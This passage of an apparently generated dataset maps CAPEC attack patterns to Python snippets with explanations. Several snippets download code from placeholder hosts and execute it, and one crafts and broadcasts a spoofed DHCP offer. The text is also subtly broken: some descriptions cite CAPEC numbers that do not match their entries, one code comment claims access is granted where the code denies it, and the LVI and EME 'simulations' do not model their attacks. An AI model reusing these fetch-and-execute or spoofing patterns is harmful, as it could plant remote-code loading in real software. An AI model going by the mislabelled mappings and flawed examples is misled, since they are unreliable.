        "code_snippet": "import requests\nimport subprocess\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_package.py'\nresponse = requests.get(url)\n\n# CWE-506: Embedded Malicious Code\nwith open('malicious_package.py', 'wb') as file:\n    file.write(response.content)\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nsubprocess.run(['git', 'clone', 'http://example.com/malicious_repo.git'])\n\n# CWE-348: Use of Less Trusted Source\ntrusted_url = 'https://trustedsource.com/package.py'\nless_trusted_url = 'http://example.com/malicious_package.py'\nresponse = requests.get(less_trusted_url)\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\nsubprocess.run(['pip', 'install', 'vulnerable_package==1.0.0'])",
        "description": "This Python code snippet demonstrates a scenario where an adversary exploits multiple weaknesses to deceive users into downloading and executing malicious code. The code downloads a Python script from an untrusted source without verifying its integrity (CWE-494), writes potentially malicious content to a file (CWE-506), clones a repository from an unauthorized source (CWE-527), chooses a less trusted source over a more secure one (CWE-348), and installs a known vulnerable third-party package (CWE-1395). This embodies the main idea of the 'StarJacking' CAPEC, where an adversary manipulates software popularity metadata to trick users into trusting and using malicious packages."
    },
    {
        "capec_id": "694",
        "capec_name": "System Location Discovery",
        "code_snippet": "import os\nimport time\nimport locale\n\n# Function to gather system location information\ndef gather_system_info():\n    system_info = {}\n    \n    # Get timezone information\n    system_info['timezone'] = time.tzname\n    \n    # Get system locale information\n    system_info['locale'] = locale.getdefaultlocale()\n    \n    # Get keyboard layout (assuming a Unix-like system)\n    try:\n        with open('/etc/default/keyboard', 'r') as file:\n            system_info['keyboard_layout'] = file.read()\n    except FileNotFoundError:\n        system_info['keyboard_layout'] = 'Unknown'\n    \n    return system_info\n\n# Function to simulate exposure of sensitive system information\ndef expose_system_info():\n    info = gather_system_info()\n    \n    # Simulate exposure by printing the information\n    print(\"Exposing system information:\")\n    for key, value in info.items():\n        print(f\"{key}: {value}\")\n\n# Main execution\nif __name__ == '__main__':\n    expose_system_info()",
        "description": "This Python code snippet demonstrates the concept of 'System Location Discovery' by gathering and exposing sensitive system information such as timezone, locale, and keyboard layout. The 'gather_system_info' function collects this information, and the 'expose_system_info' function simulates the exposure of this data by printing it to the console. This code embodies the CAPEC idea by showing how an adversary might collect and expose system location information. The related CWEs are represented by the potential exposure of sensitive information (CWE-497), improper access to system files (CWE-529), and the trust of system event data (CWE-360)."
    },
    {
        "capec_id": "695",
        "capec_name": "Repo Jacking",
        "code_snippet": "import requests\nimport subprocess\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'https://example.com/malicious_script.py'\nresponse = requests.get(url)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nexec(response.text)\n\n# CWE-426: Untrusted Search Path\nsubprocess.run(['python', 'malicious_script.py'])",
        "description": "This Python code snippet demonstrates a scenario where an application downloads and executes a script from an untrusted source without verifying its integrity (CWE-494). The script is then executed directly (CWE-829), and a subprocess is created to run the script, potentially using an untrusted search path (CWE-426). This embodies the main idea of 'Repo Jacking,' where an adversary can trick users into incorporating malicious code into their applications by exploiting the redirect property of VCS repositories."
    },
    {
        "capec_id": "696",
        "capec_name": "Load Value Injection",
        "code_snippet": "import ctypes\nimport mmap\nimport os\nimport struct\n\n# Allocate a memory page\npage_size = mmap.PAGESIZE\nfd = os.open('/dev/zero', os.O_RDWR)\nmem = mmap.mmap(fd, page_size, mmap.MAP_PRIVATE, mmap.PROT_READ | mmap.PROT_WRITE)\nos.close(fd)\n\n# Induce a page fault by accessing an invalid memory address\ntry:\n    invalid_address = ctypes.c_void_p(0xdeadbeef)\n    ctypes.string_at(invalid_address, 1)\nexcept ValueError as e:\n    print(f'Page fault induced: {e}')\n\n# Simulate transient execution by accessing microarchitectural buffers\n# This is a simplified representation and does not perform actual transient execution\nbuffer = struct.pack('Q', 0x4141414141414141)  # Adversary-controlled data\nmem.write(buffer)\n\n# Read the data back, simulating the victim's access to adversary-controlled data\nmem.seek(0)\nleaked_data = struct.unpack('Q', mem.read(8))[0]\nprint(f'Leaked data: {hex(leaked_data)}')\n\nmem.close()",
        "description": "This Python code snippet demonstrates a simplified version of Load Value Injection (LVI) by inducing a page fault and simulating transient execution. The code allocates a memory page and induces a page fault by accessing an invalid memory address. It then writes adversary-controlled data to the memory, simulating the transient execution where the CPU might forward incorrect data from microarchitectural buffers. Finally, it reads the data back, representing the victim's access to the adversary-controlled data. This example highlights the potential for information exposure through microarchitectural state after transient execution, as described in the related CWEs."
    },
    {
        "capec_id": "697",
        "capec_name": "DHCP Spoofing",
        "code_snippet": "import socket\n\n# Simulate a malicious DHCP server\nclass MaliciousDHCPServer:\n    def __init__(self, ip, port):\n        self.ip = ip\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.sock.bind((self.ip, self.port))\n\n    def send_dhcp_offer(self, client_ip, client_mac):\n        # Craft a fake DHCP offer packet\n        dhcp_offer = b'\\x02' + b'\\x01' + b'\\x06' + b'\\x00'  # Message type, hardware type, hardware address length, hops\n        dhcp_offer += b'\\x00' * 4  # Transaction ID\n        dhcp_offer += b'\\x00' * 2  # Seconds elapsed\n        dhcp_offer += b'\\x00' * 2  # Bootp flags\n        dhcp_offer += socket.inet_aton(client_ip)  # Client IP address\n        dhcp_offer += socket.inet_aton(self.ip)  # Your (server) IP address\n        dhcp_offer += socket.inet_aton('0.0.0.0')  # Next server IP address\n        dhcp_offer += socket.inet_aton('0.0.0.0')  # Relay agent IP address\n        dhcp_offer += client_mac  # Client MAC address\n        dhcp_offer += b'\\x00' * 10  # Client hardware address padding\n        dhcp_offer += b'\\x00' * 64  # Server host name\n        dhcp_offer += b'\\x00' * 128  # Boot file name\n        dhcp_offer += b'\\x63\\x82\\x53\\x63'  # Magic cookie\n        dhcp_offer += b'\\x35\\x01\\x02'  # Option: DHCP Message Type (Offer)\n        dhcp_offer += b'\\xff'  # End Option\n\n        # Send the fake DHCP offer to the client\n        self.sock.sendto(dhcp_offer, ('<broadcast>', 68))\n\n# Example usage\nmalicious_server = MaliciousDHCPServer('192.168.1.1', 67)\nmalicious_server.send_dhcp_offer('192.168.1.100', b'\\x00\\x0c\\x29\\x3e\\x1c\\x2a')",
        "description": "This Python code snippet simulates a malicious DHCP server that sends a fake DHCP offer to a client. The `MaliciousDHCPServer` class binds to a specified IP and port, and the `send_dhcp_offer` method crafts and sends a fake DHCP offer packet to a client. This code embodies the main idea of DHCP Spoofing (CAPEC-290) by demonstrating how an adversary can masquerade as a legitimate DHCP server. The code also touches on related CWEs such as Improper Restriction of Communication Channel to Intended Endpoints (CWE-923) and Authentication Bypass by Spoofing (CWE-290) by showing how the malicious server can send unauthorized DHCP offers to clients, potentially redirecting network traffic or causing denial of service."
    },
    {
        "capec_id": "698",
        "capec_name": "Install Malicious Extension",
        "code_snippet": "import requests\nimport os\nimport importlib.util\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://malicious-website.com/malicious_extension.py'\nresponse = requests.get(url)\n\n# Save the downloaded file\nwith open('malicious_extension.py', 'wb') as file:\n    file.write(response.content)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nspec = importlib.util.spec_from_file_location('malicious_extension', 'malicious_extension.py')\nmalicious_extension = importlib.util.module_from_spec(spec)\nspec.loader.exec_module(malicious_extension)\n\n# CWE-507: Trojan Horse\n# The malicious extension might perform some benign actions\nmalicious_extension.benign_function()\n\n# CWE-506: Embedded Malicious Code\n# The malicious extension might also perform some hidden malicious actions\nmalicious_extension.malicious_function()\n\n# CWE-426: Untrusted Search Path\n# Manipulate the search path to include untrusted directories\nos.environ['PYTHONPATH'] = '/untrusted/path:' + os.environ.get('PYTHONPATH', '')",
        "description": "This Python code snippet demonstrates the concept of installing a malicious extension into trusted software, as described in the CAPEC. The code downloads a Python script from an untrusted source (CWE-494), saves it locally, and then dynamically loads and executes it (CWE-829). The downloaded script is assumed to contain both benign and malicious functions (CWE-507 and CWE-506). Additionally, the code manipulates the search path to include untrusted directories (CWE-426), potentially allowing further exploitation. This snippet highlights the risks associated with downloading and executing code from untrusted sources without proper integrity checks."
    },
    {
        "capec_id": "699",
        "capec_name": "Eavesdropping on a Monitor",
        "code_snippet": "import os\nimport time\nimport random\n\n# Simulate sensitive data being displayed on a monitor\nsensitive_data = 'Sensitive Information: User Password = 12345'\n\n# Function to simulate electromagnetic emissions (EME) from a monitor\n# This is a simplified representation and does not actually emit EME\n\ndef emit_eme(data):\n    for char in data:\n        # Simulate a delay to represent the time taken to display each character\n        time.sleep(random.uniform(0.01, 0.1))\n        # Print character to simulate display (in reality, this would be EME)\n        print(char, end='', flush=True)\n\n# Function to simulate an attacker capturing EME\n# This is a simplified representation and does not actually capture EME\n\ndef capture_eme():\n    captured_data = ''\n    # Simulate capturing data by reading from the 'displayed' output\n    for _ in range(len(sensitive_data)):\n        captured_data += random.choice(sensitive_data)\n        time.sleep(random.uniform(0.01, 0.1))\n    return captured_data\n\n# Emit EME from the monitor displaying sensitive data\nemit_eme(sensitive_data)\n\n# Simulate attacker capturing the EME\ncaptured_data = capture_eme()\n\n# Display the captured data\nprint('\\nCaptured Data:', captured_data)\n",
        "description": "This Python code snippet simulates the concept of 'Eavesdropping on a Monitor' by representing the emission and capture of electromagnetic emissions (EME) from a monitor displaying sensitive information. The 'emit_eme' function simulates the display of sensitive data on a monitor, while the 'capture_eme' function represents an attacker capturing the EME to reconstruct the displayed data. This code embodies the idea of CAPEC-1300 by demonstrating how sensitive information can be exposed through physical side channels without modifying cables or installing software. The related CWEs are represented by the unprotected transmission of sensitive data and the potential for covert channels to be exploited."
    },
    {
        "capec_id": "700",
        "capec_name": "Network Boundary Bridging",
        "code_snippet": "import socket\n\nclass NetworkBridge:\n    def __init__(self, trusted_ip, untrusted_ip, port):\n        self.trusted_ip = trusted_ip\n        self.untrusted_ip = untrusted_ip\n        self.port = port\n\n    def create_channel(self):\n        try:\n            # Create a socket to connect to the trusted network\n            trusted_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            trusted_socket.connect((self.trusted_ip, self.port))\n\n            # Create a socket to connect to the untrusted network\n            untrusted_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            untrusted_socket.connect((self.untrusted_ip, self.port))\n\n            # Bridge the two networks\n            while True:\n                data = trusted_socket.recv(1024)\n                if not data:\n                    break\n                untrusted_socket.sendall(data)\n\n                data = untrusted_socket.recv(1024)\n                if not data:\n                    break\n                trusted_socket.sendall(data)\n        except Exception as e:\n            print(f\"Error: {e}\")\n        finally:\n            trusted_socket.close()\n            untrusted_socket.close()\n\n# Example usage\nbridge = NetworkBridge('192.168.1.10', '10.0.0.10', 8080)\nbridge.create_channel()",
        "description": "This Python code snippet demonstrates a simple network bridge that connects a trusted network (192.168.1.10) and an untrusted network (10.0.0.10) on port 8080. The `NetworkBridge` class creates sockets to connect to both networks and then continuously transfers data between them. This code embodies the main idea of the CAPEC 'Network Boundary Bridging' by creating a channel that bridges trusted and untrusted networks. The code is vulnerable to several issues highlighted by the related CWEs: it does not verify the identity of the endpoints (CWE-923, CWE-300), does not ensure message integrity (CWE-924), and mixes trusted and untrusted data (CWE-501). This lack of proper access control and verification can be exploited by an adversary to bridge network boundaries and potentially compromise the network."
    },
    {
        "capec_id": "701",
        "capec_name": "Browser in the Middle (BiTM)",
        "code_snippet": "import socket\nimport threading\nimport base64\n\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-345: Insufficient Verification of Data Authenticity\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-830: Inclusion of Web Functionality from an Untrusted Source\n\n# Simulate a simple web server that serves a remote desktop session\nclass RemoteDesktopServer:\n    def __init__(self, host='0.0.0.0', port=8080):\n        self.host = host\n        self.port = port\n        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.server_socket.bind((self.host, self.port))\n        self.server_socket.listen(5)\n        print(f'Server listening on {self.host}:{self.port}')\n\n    def handle_client(self, client_socket):\n        # Simulate a remote desktop session by sending base64 encoded data\n        desktop_data = base64.b64encode(b'Fake Remote Desktop Session Data')\n        client_socket.send(desktop_data)\n        client_socket.close()\n\n    def start(self):\n        while True:\n            client_socket, addr = self.server_socket.accept()\n            print(f'Connection from {addr}')\n            client_handler = threading.Thread(target=self.handle_client, args=(client_socket,))\n            client_handler.start()\n\n# Start the remote desktop server\nserver = RemoteDesktopServer()\nserver.start()",
        "description": "This Python code snippet represents a vulnerable remote desktop server that listens for incoming connections and serves a base64 encoded 'remote desktop session' to the client. The code embodies the main idea of the CAPEC 'Browser in the Middle (BiTM)' by simulating a remote desktop session that can be accessed through a web client. The vulnerabilities are as follows:\n\n1. CWE-294: The server does not implement any authentication mechanism, making it susceptible to capture-replay attacks.\n2. CWE-345: The server does not verify the authenticity of the data being sent, allowing invalid data to be accepted.\n3. CWE-602: The server relies on the client to handle the remote desktop session, which should be a server-side responsibility.\n4. CWE-830: The server includes functionality (remote desktop session) that could be from an untrusted source, potentially granting control to an attacker.\n\nThis code is a simplified example to illustrate the concept and should not be used in a production environment."
    },
    {
        "capec_id": "702",
        "capec_name": "Exploiting Incorrect Chaining or Granularity of Hardware Debug Components",
        "code_snippet": "class DebugComponent:\n    def __init__(self, authorized=False):\n        self.authorized = authorized\n        self.debug_functions = ['read_registers', 'write_registers', 'inject_errors']\n\n    def access_debug_function(self, function_name):\n        if function_name in self.debug_functions:\n            if self.authorized:\n                return f'Accessing {function_name}'\n            else:\n                return 'Unauthorized access attempt detected'\n        else:\n            return 'Invalid debug function'\n\n# Example usage\n# Unauthorized access\ndebug_component = DebugComponent(authorized=False)\nprint(debug_component.access_debug_function('read_registers'))  # Should deny access\n\n# Authorized access\ndebug_component.authorized = True\nprint(debug_component.access_debug_function('read_registers'))  # Should allow access\n\n# Incorrect chaining or granularity\n# Assuming authorization for a group of functions without individual checks\nclass DebugComponentWithIncorrectChaining(DebugComponent):\n    def access_debug_function(self, function_name):\n        if self.authorized:  # Incorrectly assuming authorization for all functions\n            return f'Accessing {function_name}'\n        else:\n            return 'Unauthorized access attempt detected'\n\n# Example usage\n# Unauthorized access with incorrect chaining\ndebug_component_incorrect = DebugComponentWithIncorrectChaining(authorized=False)\nprint(debug_component_incorrect.access_debug_function('inject_errors'))  # Incorrectly allows access\n",
        "description": "This Python code snippet demonstrates a simplified model of a hardware debug component with access control mechanisms. The `DebugComponent` class checks if a user is authorized before allowing access to specific debug functions. The `DebugComponentWithIncorrectChaining` subclass represents a flawed implementation where authorization is assumed for all functions without individual checks, embodying the main idea of the CAPEC. This incorrect chaining or granularity can lead to unauthorized access to critical debug functionalities, such as error injection, which aligns with the related CWEs."
    }
]